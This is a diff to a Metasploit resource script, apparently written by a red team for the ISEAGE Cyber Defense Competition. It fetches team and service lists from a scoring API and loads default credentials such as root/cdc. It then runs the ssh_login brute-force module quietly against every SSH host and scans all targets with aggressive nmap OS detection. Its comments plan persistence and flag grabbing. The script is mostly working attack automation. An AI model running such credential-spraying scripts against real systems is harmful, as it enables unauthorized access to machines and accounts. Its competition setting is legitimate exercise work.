@@ -4,6 +4,11 @@
 <ruby>
 require 'resolv'
 
+# Put any creds you think may exist in this list (Passwords only)
+# Use the username as the 'key' and the password as the 'value'
+creds = {"root"=> "cdc",
+	 "cdc"=> "cdc"}
+
 puts
 puts "************************"
 puts "Aquiring Targets"
@@ -14,16 +19,66 @@ s_uri = URI("https://iscore.iseage.org/api/v1/services")
 services = Net::HTTP.get(s_uri)
 services = JSON.parse(services)
 
+t_uri = URI("https://iscore.iseage.org/api/v1/teams")
+teams = Net::HTTP.get(t_uri)
+teams = JSON.parse(teams)
+
+
 dns_names = Array.new
+nums = []
+
+teams.each do |team|
+  # IScorE returns only active teams, so we do this to make sure that we only target the real teams.
+  nums.append(team["number"])
+end 
+
+puts "Found " + nums.length().to_s + " teams"
+
+ssh_targets = []
 
 services.each do |serv|
-  nums = 1..40
   nums.each do |n|
     # ip = Resolv.getaddress(serv["url"].gsub("{num}", n.to_s))
     # framework.db.report_host(host: ip)
     dns_names.append(serv["url"].gsub("{num}", n.to_s))
+    if serv["protocol"] == "SSH"
+      ssh_targets.append(serv["url"].gsub("{num}", n.to_s))
+    end
   end
 end
+
+puts "Found " + dns_names.length().to_s + " target DNS names"
+
+puts
+puts "************************"
+puts "Loading creds"
+puts "************************"
+puts
+
+# TODO: Consider moving this to a file of some kind, rahter than a hash at the top
+creds.keys.each do |user|
+  run_single("creds add user:" + user + " password:" +creds[user])
+end
+
+puts "Loaded " + creds.length().to_s + " creds"
+
+puts
+puts "************************"
+puts "Attempting SSH attacks"
+puts "************************"
+puts
+
+# We do this first, because this is the thing that is most likely to be easily exploited, using the default creds
+
+puts ssh_targets.length().to_s + " targets"
+
+run_single("use auxiliary/scanner/ssh/ssh_login")
+run_single("set DB_ALL_PASS true")
+run_single("set DB_ALL_USERS true")
+run_single("set BLANK_PASSWORDS true")
+run_single("set RHOSTS " + ssh_targets.join(' '))
+run_single("run -j -q") # Run this in the background, and do it quietly
+# TODO: Consider adding automated post connection stuff, ie persistance, flag nabbing
 
 puts
 puts "************************"
@@ -31,7 +86,14 @@ puts "Running db_nmap"
 puts "************************"
 puts
 
+# Let's load the database with some more actionable information about all the CDC hosts
+# Using the flags we are so as to make this take less than the whole eight hours
 run_single('db_nmap -O -T5 ' + dns_names.join(' '))
 
-
 </ruby>
+
+# Tell us where the script left us
+jobs
+sessions
+
+
